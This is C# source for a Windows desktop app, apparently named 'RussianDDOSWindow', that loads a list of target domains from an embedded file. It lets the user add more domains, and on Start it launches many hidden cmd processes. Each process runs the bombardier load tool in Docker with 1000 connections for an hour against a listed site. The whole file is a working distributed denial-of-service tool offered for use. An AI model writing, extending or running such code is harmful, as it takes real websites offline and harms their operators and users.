using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;

namespace RussianDDOSWindow
{
    public partial class MainWindow : Window
    {
        ObservableCollection<SiteDataContext> sites = new ObservableCollection<SiteDataContext>();
        List<Process> processes = new List<Process>();

        public MainWindow()
        {
            InitializeComponent();
            Width = 250;
            SitesColumn.Width = new GridLength(0, GridUnitType.Star);
            Sites_DataGrid.ItemsSource = sites;

            using (var reader = new StreamReader(GetResourceStream("domains2.txt")))
            {
                var content = reader.ReadToEnd().Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries).Select(x => new SiteDataContext(x));
                foreach (var item in content)
                {
                    sites.Add(item);
                }
            }
        }
        static UnmanagedMemoryStream GetResourceStream(string resName)
        {
            var assembly = Assembly.GetExecutingAssembly();
            var strResources = assembly.GetName().Name + ".g.resources";
            var rStream = assembly.GetManifestResourceStream(strResources);
            var resourceReader = new System.Resources.ResourceReader(rStream);
            var items = resourceReader.OfType<System.Collections.DictionaryEntry>();
            var stream = items.First(x => (x.Key as string) == resName.ToLower()).Value;
            return (UnmanagedMemoryStream)stream;
        }

        private async void Start_Button_Click(object sender, RoutedEventArgs e)
        {
            Stop_Button.IsEnabled = false;
            try
            {
                var count = int.Parse(DDOS_Count_TextBox.Text) + processes.Count;
                MainProgressBar.Maximum = count;

                for (int i = processes.Count, j = 0; i < count; i++, j++)
                {
                    if (j >= sites.Count) j = 0;
                    var process = await StartProcess(sites[j].Site);
                    processes.Add(process);
                    MainProgressBar.Value = processes.Count;
                }
            }
            catch (Exception err)
            {
                MessageBox.Show($"Some error occured: {err}");
            }
            Stop_Button.IsEnabled = true;
        }

        private async Task<Process> StartProcess(string domain)
        {
            string command = $"/C docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://{domain}";
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Minimized,
                FileName = "cmd.exe",
                Arguments = command
            };
            process.StartInfo = startInfo;
            await Task.Run(() => process.Start());
            return process;
        }

        private async void Stop_Button_Click(object sender, RoutedEventArgs e)
        {
            Start_Button.IsEnabled = false;
            for (int i = processes.Count - 1; i >= 0; i--)
            {
                await Task.Run(() => processes[i].CloseMainWindow());
                MainProgressBar.Value = i;
                processes.Remove(processes[i]);
            }
            Start_Button.IsEnabled = true;
        }
        private void Window_Closed(object sender, EventArgs e) => Stop_Button_Click(null, null);

        private void OpenSites_Button_Click(object sender, RoutedEventArgs e)
        {
            if (SitesColumn.ActualWidth is 0)
            {
                Width = 500;
                SitesColumn.Width = new GridLength(6, GridUnitType.Star);
                (OpenSites_Button.Content as TextBlock).Text = "<";
            }
            else
            {
                Width = 250;
                SitesColumn.Width = new GridLength(0, GridUnitType.Star);
                (OpenSites_Button.Content as TextBlock).Text = ">";
            }            
        }

        private void AddSite_Button_Click(object sender, RoutedEventArgs e)
        {
            var text = AddSites_TextBox.Text;
            if (string.IsNullOrEmpty(text)) return;
            sites.Add(new SiteDataContext(text));
        }
        private void DeleteSiteButton_Click(object sender, RoutedEventArgs e)
        {
            sites.Remove((sender as Button).DataContext as SiteDataContext);
        }
    }

    public class SiteDataContext
    {
        public SiteDataContext(string site)
        {
            Site = site;
        }
        [DisplayName("Site")]
        public string Site { get; set; }
    }
}